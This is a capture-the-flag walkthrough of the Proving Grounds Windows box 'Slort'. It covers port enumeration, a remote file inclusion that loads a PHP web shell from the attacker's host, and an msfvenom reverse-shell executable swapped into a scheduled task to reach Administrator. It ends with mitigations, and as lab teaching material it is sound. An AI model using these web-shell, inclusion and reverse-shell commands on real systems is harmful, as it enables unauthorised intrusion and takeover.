## Introduction
In this walkthrough we will be solving Proving Grounds Intermediate Windows box Slort. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
 sudo nmap -sV $IP --open
```

### UDP

Check first 100 UDP ports to not to miss valuable services like SNMP.

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open
```

## Services

### Port 21

- I tried to login using `admin:admin`, `anonymous:anonymous`, `admin:' '`  but **couldn’t login**
- Searching for public exploits we see

    **maybe the last one could be useful**
    

### Port 139/445

- Tried anonymous access

```bash
smbclient -L //$IP/ -N 
```

but **not allowed**

- enum4linux

```bash
 enum4linux $IP
```

**nothing interesting**

### Port 3306

Our host **is not allowed** to connect to MariaDB server.

## Web

### Port 4443

- **We see phpinfo page PHPINFO**

    ![image.png](image%207.png)
    
    ![image.png](image%208.png)
    
- **Directory Fuzzing**

```bash
gobuster dir -u http://$IP:4443 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -x .php,.txt
```

### Port 8080

…

## Exploitation

I see RFI misconfiguration from PHPINFO page, that means we can include a web shell or reverse shell . First I included web shell and run cmd, it worked

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```bash
curl http://192.168.103.53:4443/site/index.php?page=http://192.168.45.179/shell.php\&cmd=whoami
```

![image.png](image%2010.png)

 then I included reverse shell directly which returned me a reverse shell.

You can find reverse shell from the following [website](https://www.revshells.com/)

```bash
curl http://192.168.103.53:4443/site/index.php?page=http://192.168.45.179/shellnew.php
```

## Privilege Escalation

- [ ]  Situational Awareness
- [ ]  User/Group Privileges
- [ ]  PowerShell History(Transcription, Script Logging)
- [ ]  Sensitive Files
- [ ]  Insecure Service Executables
- [ ]  DLL hijacking
- [ ]  Unquoted Service Path
- [ ]  Application-based exploits
- [ ]  Kernel Exploits
- [ ]  Check root, user home, Documents, Desktop, Downloads directories.

I saw in root directory **Backup** folder where scheduled task was present so I changed it with my reverse.exe file

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.179 LPORT=8080 -f exe -o reverse.exe
```

and got a shell.

Now we are Administrator.

## Mitigation

1. **Disable Remote File Inclusion (RFI)**: Set `allow_url_fopen=Off` and `allow_url_include=Off` in the `php.ini` configuration to prevent attackers from including remote files.
2. **Restrict File Permissions**: Ensure that only authorized users have write access to critical directories like `C:\`. Regularly audit and enforce least privilege access.
3. **Monitor and Restrict Scheduled Tasks**: Limit who can modify scheduled task executables and enable logging to detect unauthorized changes.
4. **Apply Principle of Least Privilege**: Ensure that services and scheduled tasks run with the minimal necessary permissions to limit the impact of privilege escalation.
